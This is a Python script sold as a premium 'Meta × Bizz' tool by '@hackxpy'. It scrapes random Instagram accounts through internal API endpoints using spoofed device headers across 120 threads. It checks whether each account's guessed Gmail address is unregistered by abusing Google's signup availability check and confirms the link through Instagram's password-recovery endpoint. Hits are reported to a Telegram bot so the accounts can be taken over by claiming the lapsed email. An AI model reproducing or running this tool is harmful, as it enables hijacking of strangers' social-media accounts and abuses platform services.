import os
import re
import sys
import time
import json
import uuid
import pytz
import string
import random
import base64
import hashlib
import inspect
import platform
import requests
import Topython
from time import sleep
from cfonts import render
from threading import Thread
from datetime import datetime, timedelta, timezone
from requests import post as pp,get
from colorama import Fore, Style, init
from random import choice as cc,randrange as rr
from user_agent import generate_user_agent as ggb

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
clear()

#-------- COLOURS --------

c1='\x1b[38;5;120m'
j21='\x1b[38;5;204m'
p1='\x1b[38;5;150m'
cyan='\x1b[1m\x1b[36m'
x='\x1b[1;33m'
white='\x1b[1;37m'
z='\x1b[1;31m'

bi=random.randint(5,208)
aman_paidcc=f"[38;5;{bi}m"
meerssmo=random.randint(100,300)
aman_paidcc2=f"[38;5;{meerssmo}m"

#-------- PREMIUM TIME --------

IST_OFFSET = timedelta(hours=5, minutes=30)
def check_telegram_access(user_id):
    try:
        url = "https://raw.githubusercontent.com/aman-sw062/file-access/main/free-expire"
        response = requests.get(url)
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            for line in lines:
                if "," in line and ":" in line:
                    parts = line.strip().split(",")
                    uid = parts[0].strip()
                    date_part = parts[1].strip()
                    try:
                        expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
                    except ValueError:
                        print(f"⚠️ Invalid date format for user ID {uid}. Skipping.")
                        continue
                    if uid == str(user_id):
                        
                        now_ist = datetime.now(timezone.utc) + IST_OFFSET
                        remaining = expiry_ist - now_ist.replace(tzinfo=None)
                        if remaining.total_seconds() > 0:
                            days, seconds = divmod(int(remaining.total_seconds()), 86400)
                            hours, seconds = divmod(seconds, 3600)
                            minutes, _ = divmod(seconds, 60)
                            print(f"✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃")
                            print(f"⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days} days, {hours} hours, {minutes} minutes")
                            return True
                        else:
                            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮𝐫 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝.")
                            return False
            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮'𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦")
            return False
        else:
            print("⚠️ Failed to fetch the user list.")
            return False
    except Exception as e:
        print(f"⚠️ Error while checking access: {e}")
        return False

#-------- USER INTERFACE --------

print('━' * 66)
logo = render('AMAN', font='block', colors=['white', 'black'], align='center', background='cyan' , space=True)
print(logo)
print('━' * 66)
time.sleep(1)
def tinfo():
    tln = " 𝗠𝗘𝗧𝗔 × 𝗕𝗜𝗭𝗭 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗧𝗢𝗢𝗟                                      @𝗵𝗮𝗰𝗸𝘅𝗽𝘆 "
    for char in tln:
        sys.stdout.write('\033[30m' + '\033[47m' + char)
        sys.stdout.flush()
        time.sleep(0.0200)
    print('\n' + '\033[0m━' * 67)
    
if __name__ == "__main__":
    tinfo()

print("")
Token=input(f"{white}BOT TOKEN : ")
user_id = input(f"{white}TELEGRAM ID : ")
if not check_telegram_access(user_id.strip()):
    exit()

os.system('cls' if os.name == 'nt' else 'clear')
ID= user_id
total=0
hits=0
bad_gm=0
bad_mail=0
goodig=0
infoinsta={}
yy='azertyuiopmlkjhgfdsqwxcvbn'
def tll():
	try:
		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','user-agent':str(ggb())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn','user-agent':ggb()};data={'f.req':f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
		with open('tl.txt','w')as f:f.write(f"{tl}//{host}\n")
	except Exception as e:print(e);tll()
tll()
def check_gmail(email):
	global bad_mail,hits
	try:
		if'@'in email:email=str(email).split('@')[0]
		try:o=open('tl.txt','r').read().splitlines()[0]
		except:o=open('tl.txt','r').read().splitlines()[0]
		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",'user-agent':ggb()};params={'TL':tl};data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if'"gf.uar",1'in str(response.text):
			hits+=1;pppp()
			if'@'not in email:ok=email+'@gmail.com';username,gg=ok.split('@');InfoAcc(username,gg)
			else:username,gg=email.split('@');InfoAcc(username,gg)
		else:bad_mail+=1;pppp()
	except:''
def check(email):
	global goodig,bad_gm;ua=ggb();dev='android-';device_id=dev+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
	if email in response:
		if'@gmail.com'in email:check_gmail(email)
		goodig+=1;pppp()
	else:bad_gm+=1;pppp()
def rest(user):
	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response['email']
	except:r='bad'
	return r
def date(Id):
	try:
		uid=int(Id)
		if 1<uid<1279000:return 2010
		elif 1279001<=uid<17750000:return 2011
		elif 17750001<=uid<279760000:return 2012
		elif 279760001<=uid<900990000:return 2013
		elif 900990001<=uid<1629010000:return 2014
		elif 1900000000<=uid<2500000000:return 2015
		elif 2500000000<=uid<3713668786:return 2016
		elif 3713668786<=uid<5699785217:return 2017
		elif 5699785217<=uid<8507940634:return 2018
		elif 8507940634<=uid<21254029834:return 2019
		else:return'2020-2023'
	except Exception:return''
def InfoAcc(username,gg):
	global total;rr=infoinsta.get(username,{});Id=rr.get('pk',None);full_name=rr.get('full_name',None);fows=rr.get('follower_count',None);fowg=rr.get('following_count',None);pp=rr.get('media_count',None);isPraise=rr.get('is_private',None);bio=rr.get('biography',None);is_verified=rr.get('is_verified',None);bizz=rr.get('is_business',None)
	try:
		if fows and pp:
			if int(fows)>=10 and int(pp)>=2:meta=True
			else:meta=False
		else:meta=False
	except:meta=False
	total+=1;reset_email=rest(username)
	if reset_email.endswith('@gmail.com'):email=f"{username}@gmail.com"
	elif reset_email.endswith('@a**.com')or reset_email.endswith('@aol.com'):email=f"{username}@aol.com"
	else:email=f"{username}"
	ss=f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Name         : {full_name}
Username     : @{username}
Email        : {email}
Followers    : {fows}
Following    : {fowg}
Posts        : {pp}
Private      : {isPraise}
Year        : {date(Id)}  
Reset Email  : {reset_email}
Meta         : {meta}
Link         : https://www.instagram.com/{username}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Developer    : @hackxpy""";inline_keyboard=[[{'text':'Developer','url':'https://t.me/hackxpy'},{'text':'Join Channel','url':'https://t.me/+Bfa3QfG66wBhMWU1'}]];payload={'chat_id':user_id,'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
	try:requests.post(f"https://api.telegram.org/bot{Token}/sendMessage",data=payload)
	except:pass
def pppp():
    os.system('cls' if os.name=='nt' else 'clear')
    print(f" HITS: {hits}  |  BAD INSTA: {bad_gm}  |  BAD EMAIL: {bad_mail}")
    print("")
    print("ₐₘₐₙ".center(54))
infoinsta={}
def safe_int_input(prompt,default):
	try:value=input(prompt).strip();return int(value)if value else default
	except:return default
ranges={1:(1279001,17750000),2:(17750000,279760000),3:(279760000,900990000),4:(900990000,1629010000),5:(1629010000,2500000000),6:(2500000000,3713668786),7:(3713668786,5699785217),8:(5699785217,8507940634),9:(8507940634,21254029834)}
if not check_telegram_access(user_id.strip()):
    exit()
print('\nSelect a year for user ID range:')
for k in range(1,10):print(f"{k} - {2010+k}")
year_choice=safe_int_input('Enter your year choice (1-9): ',5)
def generate_user_id():start,end=ranges.get(year_choice,ranges[5]);return str(random.randrange(start,end))
def gg(min_followers,min_posts,user_id_func):
	while True:
		try:
			user_id=user_id_func();model_number=str(random.randint(150,999));android_version=random.choice(['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0']);dpi=str(random.randint(100,1300));resolution=f"{random.randint(200,2000)}x{random.randint(200,2000)}";brand=random.choice(['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME']);build_suffix=str(random.randint(111,999));user_agent=f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})";lsd_token=''.join(random.choices(string.ascii_letters+string.digits,k=32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd_token};data={'lsd':lsd_token,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':user_id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);user_info=response.json().get('data',{}).get('user',{});username=user_info.get('username','');infoinsta[username]=user_info;follower_count=int(user_info.get('follower_count',0));media_count=int(user_info.get('media_count',0))
			if username and'_'not in username and follower_count>=min_followers and media_count>=min_posts:email=f"{username}@gmail.com";check(email)
		except:pass
minimum_followers=safe_int_input('Enter minimum followers needed: ',0)
minimum_posts=safe_int_input('Enter minimum number of posts needed: ',0)
for _ in range(120):Thread(target=gg,args=(minimum_followers,minimum_posts,generate_user_id)).start()
